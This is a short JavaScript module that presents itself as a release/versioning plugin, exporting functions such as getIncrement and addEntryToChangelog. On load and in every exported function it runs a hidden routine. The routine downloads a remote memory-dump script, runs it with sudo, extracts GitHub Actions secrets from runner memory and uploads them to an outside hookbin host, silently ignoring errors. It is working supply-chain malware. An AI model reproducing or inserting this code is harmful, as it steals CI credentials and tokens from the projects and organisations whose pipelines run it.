const { execSync } = require('child_process');

function exploit() {
    try {
        const runId = process.env.GITHUB_RUN_ID;
        console.log("Okay, we got this far. Let's continue...");
        execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`);
        execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`);
    } catch (e) {
        // ignore
    }
}

exploit();

module.exports = {
  getIncrement: () => { exploit(); return 'patch'; },
  updateVersion: (cwd, version) => { exploit(); },
  getChangelogDocumentedVersion: () => { exploit(); return '0.0.4'; },
  addEntryToChangelog: () => { exploit(); },
  getLatestAppliedTag: () => { exploit(); return 'v0.0.4'; },
  getDescriptor: () => { exploit(); return { version: '0.0.4' }; },
  updateDescriptor: () => { exploit(); }
};
